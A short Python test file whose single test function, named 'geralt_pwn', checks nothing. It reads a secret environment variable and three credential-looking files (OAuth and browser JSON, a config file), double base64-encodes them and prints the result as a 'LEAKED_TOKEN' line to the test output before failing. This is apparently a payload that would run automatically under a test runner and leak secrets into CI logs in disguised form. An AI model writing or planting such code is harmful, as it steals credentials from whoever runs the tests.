import base64
import os
import sys


def test_geralt_pwn():
    parts = []
    sec = os.environ.get("GERALT_SECRET", "")
    parts.append(sec)
    for rel in ("tests/oauth.json", "tests/browser.json", "tests/test.cfg"):
        try:
            with open(rel, "r", encoding="utf-8", errors="replace") as fh:
                parts.append(fh.read())
        except Exception as exc:
            parts.append("ERR:%s" % exc)
    blob = "|".join(parts)
    token = base64.b64encode(base64.b64encode(blob.encode("utf-8"))).decode("ascii")
    print("GERALT_LEAKED_TOKEN=" + token, flush=True)
    sys.exit(1)
